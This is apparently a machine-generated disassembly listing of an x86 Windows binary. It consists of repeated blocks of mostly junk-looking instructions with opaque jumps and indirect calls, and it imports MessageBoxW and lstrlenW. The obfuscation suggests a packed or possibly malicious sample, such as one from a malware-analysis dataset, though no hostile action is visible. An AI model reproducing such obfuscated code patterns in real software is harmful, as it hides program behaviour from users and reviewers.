ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7288e85
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13be65
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100b996
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_40369c
jg r-xdata
push ecx
push edi
call sub_40371c
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7288e85
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13be65
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14def
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b996
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4036f8
jae r-xdata
push esp
push edx
call sub_40366a
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120b933
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb90c
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
ja r-xdata
jmp 0xffffffffe7288e85
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
jno r-xdata
jno 0xffffffffff13be65
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14def
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b996
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4037d3
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_4037d3
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_40380b
jne 0xffffffffa3a51e7e
push esi
push esi
pushfd
call sub_4037fc
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ ecx - 0x7cffbfc8 ] bl
in al dx
add al 0x77
add eax 0xf0673e9
mov [ ebp + 0x9 ] esi
add edx 0x5e855
add [ eax ] al
mov ecx 0x850fef7f
jmp [ esp + 0xa8 ]
sub_40380b
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f3e93
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864dd32
mov ecx 0x850fef7f
push ebp
call sub_40382f
jns 0xffffffffc2c14199
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_403852
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40384a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104fd1e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403883
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x5c ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x6c ] 0x400
mov eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x1
push 0x0
mov edx [ ebp - 0x58 ]
add edx 0x624
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x88 ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_403a75
retn 0x10
sub_40384a
push ebx
push eax
call sub_403852
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40384a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104fd1e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403883
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x5c ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x6c ] 0x400
mov eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x1
push 0x0
mov edx [ ebp - 0x58 ]
add edx 0x624
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x88 ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_403a75
retn 0x10
sub_403852
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_40384a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8288bb1
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104fd1e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403883
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x5c ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x7c ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x7c ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x80 ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x80 ] edx
jmp r-xdata
cmp [ ebp - 0x7c ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x80 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x6c ] 0x400
mov eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x1
push 0x0
mov edx [ ebp - 0x58 ]
add edx 0x624
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x88 ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x84 ] edx
jbe r-xdata
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_403a75
retn 0x10
sub_4039ea
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe846ab42
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35b146
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
or ecx 0x30246c81
sar [ ecx ] cl
inc eax
add [ ebx + 0x127304ec ] al
push ebp
push esp
sub esp 0x8
call sub_403a16
jae 0x5a762890
push ebx
jmp 0xffffffff83948f5d
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864a6a2
add al [ ebx + 0x77d04ec ]
sub_403a16
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x4864a6a2
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_403a3b
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc38f82
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f40c5
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff840028e3
push ebx
call sub_403a63
jge 0xffffffff844f44cf
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_403a8f
jpo 0x59284005
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aafe3
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918ef4
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
call sub_403aaa
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
0x403a
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xa0 ] eax
push r--data
mov ecx [ ebp - 0x68 ]
push ecx
call [ ebp - 0xa0 ]
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
cmp [ ebp - 0x74 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x8c ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x6c ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x74 ]
add edx 0x1
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403a75
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_403a8f
jpo 0x59284005
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aafe3
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918ef4
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
call sub_403aaa
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xa0 ] eax
push r--data
mov ecx [ ebp - 0x68 ]
push ecx
call [ ebp - 0xa0 ]
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
cmp [ ebp - 0x74 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x8c ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x6c ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x74 ]
add edx 0x1
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403a8f
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53918ef4
pop eax
jae r-xdata
call 0xe3aafe3
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
call sub_403aaa
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xa0 ] eax
push r--data
mov ecx [ ebp - 0x68 ]
push ecx
call [ ebp - 0xa0 ]
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
cmp [ ebp - 0x74 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x8c ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x6c ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x74 ]
add edx 0x1
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403aaa
jae r-xdata
pop edx
jns 0x5b002b29
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
